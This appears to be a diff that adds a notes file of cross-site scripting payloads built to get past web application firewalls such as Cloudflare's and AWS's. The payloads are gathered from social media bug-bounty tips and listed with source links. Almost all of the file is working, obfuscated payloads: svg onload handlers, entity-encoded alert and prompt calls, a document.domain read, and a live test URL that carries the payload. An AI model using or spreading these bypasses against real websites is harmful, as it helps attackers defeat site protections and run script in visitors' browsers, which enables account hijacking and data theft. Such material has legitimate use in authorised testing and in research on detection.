@@ -1,0 +1,49 @@
+WAF bypass payload and detailed explanation by 
+@s0md3v
+<sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//
+<svg onload=alert%26%230000000040"1")>
+Dec: <svg onload=prompt%26%230000000040document.domain)> Hex: <svg onload=prompt%26%23x000000028;document.domain)>
+
+Cloudflare #XSS WAF Bypass. Payload: "%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F #bugbountytips #cybersecurity #infosec #xss
+
+
+AWS #XSS WAF #bypass by 
+@neeraj_sonaniya
+Just prepend <! to your #XSS payload. eg: <!<script>alert(1)</script> #BugBounty #bugbountytip #InfoSec #tech #CyberSecurity
+
+
+https://github.com/waf-bypass-maker/waf-community-bypasses/blob/main/payloads.twitter.csv
+
+
+https://waf-bypass.com/tag/xss/
+
+
+
+https://blog.yeswehack.com/yeswerhackers/web-application-firewall-bypass/
+
+ # 
+
+Payload: "%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+
+https://waf.cumulusfire.net/?globalHtml=%20%22%2Bself[%2F*foo*%2F%27alert%27%2F*bar*%2F](self[%2F*foo*%2F%27document%27%2F*bar*%2F][%27domain%27])%2F%2F
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
